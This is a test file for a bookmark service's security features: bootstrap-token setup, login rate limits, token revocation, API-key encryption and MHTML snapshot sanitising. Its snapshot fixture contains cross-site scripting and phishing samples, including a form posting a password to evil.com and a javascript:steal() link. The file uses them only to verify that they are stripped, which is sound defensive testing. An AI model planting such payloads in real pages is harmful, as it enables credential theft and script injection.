/** A4 安全默认值与快照闭环验收 */
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdtempSync, rmSync, readFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { fixtureDummyApiKey, fixtureInvalidSetupToken, fixturePassword, makeEnv, type TestEnv } from "./test-env";
import { clearLoginFailures } from "./security";
import {
  extractHtmlFromMhtml,
  sanitizeSnapshotHtml,
  buildSnapshotView,
} from "./snapshot-view";
import { encryptSecret, decryptSecret, protectKeyForStorage, keyForUse } from "./secret-box";

let env: TestEnv;
let savedEnv: string | undefined;
beforeEach(() => {
  savedEnv = process.env.MF_ENV;
  // 限速器是模块级内存滑窗：清掉跨测试残留（键见 app.ts/security.ts：admin-env:<key> / admin-db:<key>）
  clearLoginFailures("admin-db:local");
  clearLoginFailures("admin-env:local");
});
afterEach(() => {
  env?.cleanup();
  if (savedEnv === undefined) delete process.env.MF_ENV;
  else process.env.MF_ENV = savedEnv;
  delete process.env.MF_SECRET_KEY;
});

describe("A4-1 + DEV-05 非开发部署首启强制凭据与引导流程", () => {
  /** 触发生成并读取首启引导凭据（dataDir/bootstrap-token.txt）——生产语义 setup 的必备头 */
  async function bootstrapOf(env: TestEnv): Promise<string> {
    // 无凭据请求触发生成（返回 403，但引导文件已落盘）
    await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ password: fixturePassword("main") }),
    });
    return readFileSync(path.join(env.dataDir, "bootstrap-token.txt"), "utf8").trim();
  }

  it("生产语义 + 未初始化：全部 API 503，仅 setup/healthz 放行", async () => {
    process.env.MF_ENV = "production";
    env = makeEnv(null);

    const blocked = await env.app.request("/api/v1/bookmarks");
    expect(blocked.status).toBe(503);
    const healthz = await env.app.request("/healthz");
    expect(healthz.status).toBe(200);

    // DEV-05：无引导凭据 → 403 setup_token_required（禁止暴露端口后抢先设管理员）
    const noToken = await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ password: fixturePassword("main") }),
    });
    expect(noToken.status).toBe(403);

    // 引导文件已生成（路径可见、凭据不进日志）
    const bootstrap = await bootstrapOf(env);
    expect(bootstrap.length).toBeGreaterThanOrEqual(24);

    // 携带引导凭据 setup 成功；引导凭据一次性（已失效）
    const setup = await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json", "x-mf-setup-token": bootstrap },
      body: JSON.stringify({ password: fixturePassword("main") }),
    });
    expect(setup.status).toBe(200);
    expect(env.registry.findUserById("self")).toMatchObject({ username: "admin", role: "admin" });
    const unifiedLogin = await env.app.request("/auth/login", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ username: "admin", password: fixturePassword("main"), label: "unified-after-setup" }),
    });
    expect(unifiedLogin.status).toBe(200);
    const replay = await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json", "x-mf-setup-token": bootstrap },
      body: JSON.stringify({ password: fixturePassword("second") }),
    });
    expect(replay.status).toBe(400);
    expect(((await replay.json()) as { error: string }).error).toBe("already_initialized");

    // setup 后：未登录仍 401；登录拿 token 后可用
    const still = await env.app.request("/api/v1/bookmarks");
    expect(still.status).toBe(401);
    const loginRes = await env.app.request("/auth/login", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ password: fixturePassword("main"), label: "test" }),
    });
    const { token } = (await loginRes.json()) as { token: string };
    const ok = await env.app.request("/api/v1/bookmarks", {
      headers: { authorization: `Bearer ${token}` },
    });
    expect(ok.status).toBe(200);
  });

  it("setup 仅一次：重复设置拒绝；弱密码拒绝；错误引导凭据拒绝", async () => {
    process.env.MF_ENV = "production";
    env = makeEnv(null);
    const weak = await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json", "x-mf-setup-token": await bootstrapOf(env) },
      body: JSON.stringify({ password: fixturePassword("short") }),
    });
    expect(weak.status).toBe(400);
    const badToken = await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json", "x-mf-setup-token": fixtureInvalidSetupToken() },
      body: JSON.stringify({ password: fixturePassword("main") }),
    });
    expect(badToken.status).toBe(403);
    await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json", "x-mf-setup-token": await bootstrapOf(env) },
      body: JSON.stringify({ password: fixturePassword("main") }),
    });
    const again = await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json", "x-mf-setup-token": await bootstrapOf(env) },
      body: JSON.stringify({ password: fixturePassword("second") }),
    });
    expect(again.status).toBe(400);
  });

  it("登录速率限制：5 次失败后 429", async () => {
    process.env.MF_ENV = "production";
    env = makeEnv(null);
    await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json", "x-mf-setup-token": await bootstrapOf(env) },
      body: JSON.stringify({ password: fixturePassword("main") }),
    });
    let last = 0;
    for (let i = 0; i < 6; i++) {
      const res = await env.app.request("/auth/login", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ password: fixturePassword("wrong") }),
      });
      last = res.status;
    }
    expect(last).toBe(429);
  });

  it("令牌撤销：logout 后原 token 失效（A4-1）；列表按非密 ID 撤销另一设备", async () => {
    process.env.MF_ENV = "production";
    env = makeEnv(null);
    await env.app.request("/api/v1/admin/setup", {
      method: "POST",
      headers: { "content-type": "application/json", "x-mf-setup-token": await bootstrapOf(env) },
      body: JSON.stringify({ password: fixturePassword("main") }),
    });
    const loginBody = {
      method: "POST",
      headers: { "content-type": "application/json", "x-forwarded-for": "10.9.9.9" },
      body: JSON.stringify({ password: fixturePassword("main") }),
    };
    const { token } = (await (await env.app.request("/auth/login", loginBody)).json()) as { token: string };
    const logout = await env.app.request("/api/v1/auth/logout", {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
    });
    expect(logout.status).toBe(200);
    const after = await env.app.request("/api/v1/bookmarks", {
      headers: { authorization: `Bearer ${token}` },
    });
    expect(after.status).toBe(401);

    // 两台新设备登录（第一台已被 logout 撤销），其中一台按 ID 撤销另一台
    const t2 = (await (await env.app.request("/auth/login", loginBody)).json()) as {
      token: string;
      tokenId: string;
    };
    const t3 = (await (await env.app.request("/auth/login", loginBody)).json()) as {
      token: string;
      tokenId: string;
    };
    void t3;
    const list = (await (
      await env.app.request("/api/v1/auth/tokens", { headers: { authorization: `Bearer ${t2.token}` } })
    ).json()) as { tokens: Array<{ token_id: string; label: string | null; revoked_at: string | null }> };
    expect(list.tokens.length).toBeGreaterThanOrEqual(2);
    // 列表不含任何 token 原值
    expect(JSON.stringify(list)).not.toContain(t2.token);
    // 未撤销的行里排除 t2 自己 → 剩余即"其他设备"
    const other = list.tokens.find((t) => t.revoked_at === null && t.token_id !== t2.tokenId);
    expect(other).toBeTruthy();
    const revoke = await env.app.request(`/api/v1/auth/tokens/${other!.token_id}`, {
      method: "DELETE",
      headers: { authorization: `Bearer ${t2.token}` },
    });
    expect(revoke.status).toBe(200);
    // 撤销标记落库；t2 本身仍可用
    const list2 = (await (
      await env.app.request("/api/v1/auth/tokens", { headers: { authorization: `Bearer ${t2.token}` } })
    ).json()) as { tokens: Array<{ token_id: string; revoked_at: string | null }> };
    expect(list2.tokens.find((t) => t.token_id === other!.token_id)?.revoked_at).toBeTruthy();
  });

  it("开发模式（MF_ENV=dev）：行为不变，无 setup 门槛", async () => {
    process.env.MF_ENV = "dev";
    env = makeEnv(null);
    const res = await env.app.request("/api/v1/bookmarks");
    expect(res.status).toBe(200);
  });
});

describe("A4-2 Provider Key 加密", () => {
  it("配置 MF_SECRET_KEY：加密落库可解密回原文；密文不含明文", () => {
    process.env.MF_SECRET_KEY = "test-secret-key-16bytes!";
    const stored = encryptSecret("sk-real-key-abc123");
    expect(stored).not.toContain("sk-real-key-abc123");
    expect(stored.startsWith("v1:")).toBe(true);
    expect(decryptSecret(stored)).toBe("sk-real-key-abc123");
  });

  it("错误密钥解不开（GCM 认证失败 → null）", () => {
    process.env.MF_SECRET_KEY = "test-secret-key-16bytes!";
    const stored = encryptSecret("sk-real-key-abc123");
    process.env.MF_SECRET_KEY = "another-secret-key-16b";
    expect(decryptSecret(stored)).toBeNull();
  });

  it("生产无 MF_SECRET_KEY：protectKeyForStorage 拒绝；开发明文放行", () => {
    delete process.env.MF_SECRET_KEY;
    process.env.MF_ENV = "production";
    expect(() => protectKeyForStorage("sk-x")).toThrow(/MF_SECRET_KEY_required/);
    process.env.MF_ENV = "dev";
    expect(protectKeyForStorage("sk-x")).toBe("sk-x");
  });

  it("keyForUse：v1 密文解密 / 明文原样（开发历史数据兼容）", () => {
    expect(keyForUse(null)).toBeNull();
    expect(keyForUse("plain-dev-key")).toBe("plain-dev-key");
    process.env.MF_SECRET_KEY = "test-secret-key-16bytes!";
    expect(keyForUse(encryptSecret("sk-zzz"))).toBe("sk-zzz");
  });

  it("API 链路：保存后 DB 无明文、列表脱敏、使用时可解密", async () => {
    process.env.MF_ENV = "test"; // makeEnv 测试环境
    process.env.MF_SECRET_KEY = "test-secret-key-16bytes!";
    env = makeEnv(null);
    await env.app.request("/api/v1/settings/providers", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        providerId: "deepseek",
        baseUrl: "https://api.deepseek.com/v1",
        apiKey: fixtureDummyApiKey(),
        purposeModels: { organize: "deepseek-chat" },
      }),
    });
    const raw = env.store.db
      .prepare("SELECT api_key FROM provider_config")
      .get() as { api_key: string | null };
    expect(raw.api_key).not.toContain(fixtureDummyApiKey());
    expect(raw.api_key?.startsWith("v1:")).toBe(true);
    const list = (await (
      await env.app.request("/api/v1/settings/providers")
    ).json()) as Array<{ api_key: string | null }>;
    expect(list[0]?.api_key).toBe("********");
    expect(env.store.enabledProviderConfigs()[0]?.api_key).toBe(fixtureDummyApiKey()); // 使用时解密
  });
});

describe("A4-4/A4-5 快照净化查看与受控下载", () => {
  const MHTML = [
    "MIME-Version: 1.0",
    'Content-Type: multipart/related; boundary="snapshot-boundary-x"',
    "",
    "--snapshot-boundary-x",
    "Content-Type: text/html; charset=utf-8",
    "Content-Transfer-Encoding: quoted-printable",
    "",
    "<!doctype html><html><head><script>alert('evil')</script></head><body>",
    "<h1>=E6=A0=87=E9=A2=98</h1>",
    '<img src=3D"https://origin-site.com/tracking.png">',
    '<form action=3D"https://evil.com/phish"><input name=pw></form>',
    '<a href=3D"javascript:steal()">x</a>',
    '<iframe src=3D"https://evil.com/frame"></iframe>',
    "<p onclick=3D\"hack()\">text</p>",
    "</body></html>",
    "",
    "--snapshot-boundary-x--",
  ].join("\r\n");

  it("MHTML 提取：quoted-printable 解码正确", () => {
    const html = extractHtmlFromMhtml(MHTML);
    expect(html).toBeTruthy();
    expect(html).toContain("标题"); // =E6=A0=87=E9=A2=98 解码
  });

  it("消毒：script/iframe/form/外链图片/on* 事件全灭", () => {
    const html = extractHtmlFromMhtml(MHTML)!;
    const clean = sanitizeSnapshotHtml(html);
    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/<iframe/i);
    expect(clean).not.toMatch(/<form/i);
    expect(clean).not.toMatch(/on click|onclick/i);
    expect(clean).not.toContain("origin-site.com");
    expect(clean).not.toContain("javascript:");
    expect(clean).toContain("<h1>标题</h1>"); // 内容保留
  });

  it("完整查看器：含 CSP 壳与下载入口", () => {
    const view = buildSnapshotView(MHTML, { snapshotId: "snap-1", title: "测试快照" });
    expect(view.ok).toBe(true);
    expect(view.viewer).toContain("下载原始 MHTML");
    expect(view.viewer).toContain("snap-1/download");
    expect(view.viewer).not.toContain("alert(");
  });

  it("API 链路：查看净化视图；下载带 attachment 与 nosniff；私密书签两者皆 403", async () => {
    process.env.MF_ENV = "test";
    env = makeEnv(null);
    const bm = (await (
      await env.app.request("/api/v1/bookmarks", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ url: "https://snap-a4.example.com/page", title: "快照页" }),
      })
    ).json()) as { id: string };
    const up = (await (
      await env.app.request(`/api/v1/snapshots?bookmarkId=${bm.id}`, {
        method: "POST",
        headers: { "content-type": "message/rfc822" },
        body: MHTML,
      })
    ).json()) as { id: string };

    const view = await env.app.request(`/api/v1/snapshots/${up.id}/view`);
    expect(view.status).toBe(200);
    expect(view.headers.get("content-security-policy")).toContain("default-src 'none'");
    const viewHtml = await view.text();
    expect(viewHtml).not.toContain("alert(");

    const dl = await env.app.request(`/api/v1/snapshots/${up.id}/download`);
    expect(dl.status).toBe(200);
    expect(dl.headers.get("content-disposition")).toContain("attachment");
    expect(dl.headers.get("x-content-type-options")).toBe("nosniff");

    // 私密书签：查看/下载均 403
    const privateBm = (await (
      await env.app.request("/api/v1/bookmarks", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ url: "https://private-a4.example.com/p", title: "私密页" }),
      })
    ).json()) as { id: string };
    await env.app.request(`/api/v1/bookmarks/${privateBm.id}`, {
      method: "PATCH",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ isPrivate: true }),
    });
    const upPrivate = await env.app.request(`/api/v1/snapshots?bookmarkId=${privateBm.id}`, {
      method: "POST",
      headers: { "content-type": "message/rfc822" },
      body: MHTML,
    });
    expect(upPrivate.status).toBe(403); // 上传即拒
  });

  it("无 HTML 部分的 MHTML：明确提示 + 受控下载（不假装可显示）", async () => {
    process.env.MF_ENV = "test";
    env = makeEnv(null);
    const bm = (await (
      await env.app.request("/api/v1/bookmarks", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ url: "https://nohtml-a4.example.com/x", title: "x" }),
      })
    ).json()) as { id: string };
    const up = (await (
      await env.app.request(`/api/v1/snapshots?bookmarkId=${bm.id}`, {
        method: "POST",
        headers: { "content-type": "message/rfc822" },
        body: 'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\nonly text\r\n--b--',
      })
    ).json()) as { id: string };
    const view = await env.app.request(`/api/v1/snapshots/${up.id}/view`);
    expect(view.status).toBe(200);
    const html = await view.text();
    expect(html).toContain("无法安全在线显示");
    expect(html).toContain("download");
  });
});
